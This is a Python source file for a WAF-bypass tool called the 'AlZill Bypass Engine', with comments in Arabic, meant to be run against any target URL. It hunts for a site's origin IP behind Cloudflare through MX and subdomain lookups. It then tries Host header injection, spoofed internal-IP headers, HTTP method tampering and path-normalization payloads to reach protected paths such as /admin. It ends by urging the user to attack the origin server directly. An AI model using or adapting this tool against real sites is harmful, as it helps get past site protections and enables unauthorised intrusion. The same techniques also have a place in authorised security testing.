#!/usr/bin/env python3
"""
Bypass Engine for AlZill Scanner V6
Advanced WAF Evasion & Origin IP Discovery
"""

import requests
import socket
import re
import random
import urllib3
import json
from urllib.parse import urlparse, urljoin, quote, unquote
from termcolor import cprint

# محاولة استيراد dns.resolver لضمان العمل على Termux
try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    cprint("[!] dnspython not installed. Run: pip install dnspython", "yellow")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# الألوان
INFO, SUCCESS, WARNING, ERROR, HIGHLIGHT = "cyan", "green", "yellow", "red", "magenta"


class BypassEngine:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # قائمة هيدرات الخداع لتجاوز الفلترة المستندة إلى الآيبي
        self.evasion_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'Forwarded': 'for=127.0.0.1;by=127.0.0.1'},
            {'Client-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'Cluster-Client-IP': '127.0.0.1'},
            {'X-ProxyUser-IP': '127.0.0.1'},
        ]
        
        # قائمة آيبيات Cloudflare (سيتم تحديثها ديناميكياً)
        self.cloudflare_ranges = self._fetch_cloudflare_ranges()
        
        # قائمة الدومينات الفرعية للبحث
        self.subdomains = [
            'dev', 'staging', 'direct', 'cpanel', 'ftp', 'mail',
            'webmail', 'admin', 'backend', 'origin', 'original',
            'server', 'host', 'vps', 'dedicated', 'cloud',
            'ns1', 'ns2', 'mx1', 'mx2', 'smtp', 'imap',
            'pop3', 'dns', 'ns', 'www2', 'www3', 'web', 'api'
        ]
        
        # قائمة Host Header Injection Payloads
        self.host_payloads = [
            'localhost', '127.0.0.1', '0.0.0.0',
            'internal', 'backend', 'origin', 'server',
            'host', 'vhost', 'local', 'intranet',
            'admin.local', 'dev.internal', 'staging.local'
        ]

    def _fetch_cloudflare_ranges(self) -> set:
        """جلب قائمة آيبيات Cloudflare من الموقع الرسمي"""
        cloudflare_ips = set()
        
        urls = [
            'https://www.cloudflare.com/ips-v4',
            'https://www.cloudflare.com/ips-v6',
            'https://api.cloudflare.com/client/v4/ips'
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    if 'ips-v4' in url or 'ips-v6' in url:
                        for line in response.text.splitlines():
                            line = line.strip()
                            if line and not line.startswith('#'):
                                cloudflare_ips.add(line)
                    elif 'api.cloudflare.com' in url:
                        data = response.json()
                        if data.get('success'):
                            for ip_range in data.get('result', {}).get('ipv4_cidrs', []):
                                cloudflare_ips.add(ip_range)
                            for ip_range in data.get('result', {}).get('ipv6_cidrs', []):
                                cloudflare_ips.add(ip_range)
                    
                    if self.verbose:
                        cprint(f"    [+] Fetched {len(cloudflare_ips)} Cloudflare IP ranges", SUCCESS)
                    break
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] Failed to fetch from {url}: {e}", WARNING)
                continue
        
        if not cloudflare_ips:
            cprint("    [!] Using static Cloudflare IP ranges", WARNING)
            cloudflare_ips = self._get_static_cloudflare_ranges()
        
        return cloudflare_ips
    
    def _get_static_cloudflare_ranges(self) -> set:
        """قائمة آيبيات Cloudflare الثابتة (محدثة)"""
        return {
            '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
            '104.16.0.0/13', '104.24.0.0/14', '108.162.192.0/18',
            '131.0.72.0/22', '141.101.64.0/18', '162.158.0.0/15',
            '172.64.0.0/13', '173.245.48.0/20', '188.114.96.0/20',
            '190.93.240.0/20', '197.234.240.0/22', '198.41.128.0/17',
            '2400:cb00::/32', '2405:8100::/32', '2405:b500::/32',
            '2606:4700::/32', '2803:f800::/32', '2c0f:f248::/32',
            '2a06:98c0::/29'
        }
    
    def _is_cloudflare_ip(self, ip: str) -> bool:
        """التحقق مما إذا كان الآيبي يخص Cloudflare"""
        import ipaddress
        
        try:
            ip_obj = ipaddress.ip_address(ip)
            for cidr in self.cloudflare_ranges:
                try:
                    if ip_obj in ipaddress.ip_network(cidr):
                        return True
                except:
                    continue
        except:
            pass
        
        return False
    
    def _double_encode(self, payload: str) -> str:
        """Double URL encoding"""
        return quote(quote(payload, safe=''), safe='')
    
    def _add_null_byte(self, payload: str) -> str:
        """إضافة Null Byte للتجاوز"""
        return payload + '%00'
    
    def _add_crlf(self, payload: str) -> str:
        """إضافة CRLF للتجاوز"""
        return payload + '%0d%0a'
    
    def find_origin_ip(self, target: str) -> str:
        """البحث عن الآيبي الحقيقي خلف Cloudflare/WAF"""
        cprint("\n[1] 🔍 Phase: Origin IP Discovery", INFO)
        domain = urlparse(target).netloc
        
        if ':' in domain:
            domain = domain.split(':')[0]
        
        discovered_ips = []
        
        if DNS_AVAILABLE:
            try:
                cprint("    [*] Checking MX records...", INFO)
                mx_records = dns.resolver.resolve(domain, 'MX')
                for mx in mx_records:
                    mx_domain = str(mx.exchange).rstrip('.')
                    try:
                        ip = socket.gethostbyname(mx_domain)
                        if not self._is_cloudflare_ip(ip):
                            cprint(f"    [+] Potential Origin IP (via MX): {ip}", SUCCESS)
                            discovered_ips.append(ip)
                    except:
                        pass
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] MX lookup failed: {e}", WARNING)
        
        cprint("    [*] Checking common subdomains...", INFO)
        for sub in self.subdomains:
            try:
                full_domain = f"{sub}.{domain}"
                ip = socket.gethostbyname(full_domain)
                if not self._is_cloudflare_ip(ip):
                    cprint(f"    [+] Potential Origin IP (via {sub}): {ip}", SUCCESS)
                    discovered_ips.append(ip)
            except:
                continue
        
        if discovered_ips:
            return discovered_ips[0]
        
        cprint("    [-] No origin IP found", WARNING)
        return None
    
    def test_host_header_injection(self, target: str) -> bool:
        """اختبار التلاعب بالـ Host Header مع Encoding"""
        cprint("\n[2] 📡 Phase: Host Header Injection", INFO)
        
        domain = urlparse(target).netloc
        if ':' in domain:
            domain = domain.split(':')[0]
        
        for payload in self.host_payloads:
            try:
                test_payloads = [
                    payload,
                    f"{payload}.{domain}",
                    f"{domain}.{payload}",
                    payload.replace('127.0.0.1', domain),
                ]
                
                for test_payload in test_payloads:
                    response = self.session.get(
                        target, 
                        headers={'Host': test_payload}, 
                        timeout=8, 
                        verify=False,
                        allow_redirects=False
                    )
                    
                    if response.status_code in [200, 301, 302, 401, 403]:
                        if 'access denied' not in response.text.lower() and 'forbidden' not in response.text.lower():
                            cprint(f"    [+] Host Header Injection: {test_payload} ({response.status_code})", SUCCESS)
                            return True
                            
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] Host header test failed: {e}", WARNING)
                continue
        
        cprint("    [-] No host header injection vectors found", WARNING)
        return False
    
    def test_header_evasion(self, target: str) -> bool:
        """اختبار الهيدرات التي تخدع الـ WAF ليعتقد أن الطلب داخلي"""
        cprint("\n[3] 🛡️ Phase: Header Evasion (Internal Spoofing)", INFO)
        
        for headers in self.evasion_headers[:30]:
            try:
                response = self.session.get(
                    target, 
                    headers=headers, 
                    timeout=8, 
                    verify=False
                )
                
                if response.status_code == 200:
                    waf_indicators = ['access denied', 'forbidden', 'blocked', 'captcha', 'cloudflare']
                    if not any(ind in response.text.lower() for ind in waf_indicators):
                        header_name = list(headers.keys())[0]
                        cprint(f"    [+] Bypass with {header_name}: {list(headers.values())[0]}", SUCCESS)
                        return True
                        
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] Header evasion failed: {e}", WARNING)
                continue
        
        cprint("    [-] No header evasion vectors found", WARNING)
        return False
    
    def test_http_method_tampering(self, target: str) -> bool:
        """اختبار تجاوز الفلترة بتغيير نوع الطلب"""
        cprint("\n[4] 🔧 Phase: HTTP Method Tampering", INFO)
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        
        for method in methods:
            try:
                for headers in self.evasion_headers[:5]:
                    response = self.session.request(
                        method, 
                        target, 
                        headers=headers,
                        timeout=8, 
                        verify=False
                    )
                    
                    if response.status_code not in [403, 405, 501]:
                        cprint(f"    [+] Method {method} is ALLOWED/UNFILTERED (Status: {response.status_code})", SUCCESS)
                        return True
                        
            except Exception as e:
                if self.verbose:
                    cprint(f"    [!] Method {method} test failed: {e}", WARNING)
                continue
        
        cprint("    [-] No method tampering vectors found", WARNING)
        return False
    
    def test_path_normalization(self, target: str) -> bool:
        """اختبار تجاوز الفلترة عبر تسوية المسار"""
        cprint("\n[5] 📁 Phase: Path Normalization Bypass", INFO)
        
        path_payloads = [
            '/./', '/../', '/%2e/', '/%2e%2e/',
            '/%252e/', '/%252e%252e/', '//', '///',
            '/%2e%2e%2f', '/%2e%2e/'
        ]
        
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for payload in path_payloads:
            test_url = base_url + payload + "admin"
            try:
                response = self.session.get(test_url, timeout=8, verify=False)
                if response.status_code == 200:
                    cprint(f"    [+] Path normalization bypass: {payload}", SUCCESS)
                    return True
            except:
                continue
        
        cprint("    [-] No path normalization bypass found", WARNING)
        return False
    
    def run_all_strategies(self, target: str, waf_type: str = "Unknown") -> bool:
        """تشغيل جميع استراتيجيات التجاوز"""
        cprint(f"\n{'='*60}", HIGHLIGHT)
        cprint(f"[*] AlZill Bypass Engine V6", HIGHLIGHT, attrs=['bold'])
        cprint(f"[*] Target: {target}", INFO)
        cprint(f"[*] WAF Type: {waf_type}", INFO)
        cprint(f"[*] DNS Available: {DNS_AVAILABLE}", INFO)
        cprint(f"[*] Cloudflare Ranges: {len(self.cloudflare_ranges)}", INFO)
        cprint(f"{'='*60}", HIGHLIGHT)
        
        results = {
            "origin_ip": self.find_origin_ip(target),
            "host_injection": self.test_host_header_injection(target),
            "header_evasion": self.test_header_evasion(target),
            "method_tampering": self.test_http_method_tampering(target),
            "path_bypass": self.test_path_normalization(target)
        }
        
        cprint("\n" + "="*60, HIGHLIGHT)
        cprint("📊 BYPASS ENGINE SUMMARY", HIGHLIGHT, attrs=['bold'])
        cprint("="*60, HIGHLIGHT)
        
        success_count = 0
        for technique, result in results.items():
            if result:
                success_count += 1
                cprint(f"  ✅ {technique}: SUCCESS", SUCCESS)
            else:
                cprint(f"  ❌ {technique}: FAILED", WARNING)
        
        cprint(f"\n[*] Success rate: {success_count}/{len(results)}", INFO)
        
        if results['origin_ip']:
            cprint(f"\n[!!!] ORIGIN IP FOUND: {results['origin_ip']}", ERROR, attrs=['bold'])
            cprint(f"[*] You can now target the origin server directly!", SUCCESS)
        
        if success_count > 0:
            cprint("\n[+] SUCCESS: Potential WAF bypass vectors identified!", SUCCESS, attrs=['bold'])
            return True
        
        cprint("\n[-] No bypass vectors found", WARNING)
        return False


# ============================================================
# Alias for backward compatibility (للكود الرئيسي)
# ============================================================
run_bypass_strategies = BypassEngine().run_all_strategies


def run_bypass(target: str, waf_type: str = "Unknown", verbose: bool = False) -> bool:
    """Run all bypass strategies against target"""
    engine = BypassEngine(verbose=verbose)
    return engine.run_all_strategies(target, waf_type)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        run_bypass(target, verbose=verbose)
    else:
        print("Usage: python bypass_engine.py <target_url> [--verbose]")
